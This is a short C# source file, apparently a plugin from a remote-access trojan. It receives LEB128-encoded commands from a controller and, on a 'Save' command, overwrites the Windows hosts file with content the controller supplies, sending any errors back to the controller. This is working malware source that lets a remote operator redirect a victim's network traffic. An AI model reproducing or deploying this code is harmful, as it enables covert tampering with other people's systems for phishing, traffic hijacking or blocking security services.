using System;
using System.IO;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			if ((string)array[0] == "Save")
			{
				File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", (string)array[1]);
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "HostsFile", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}
}
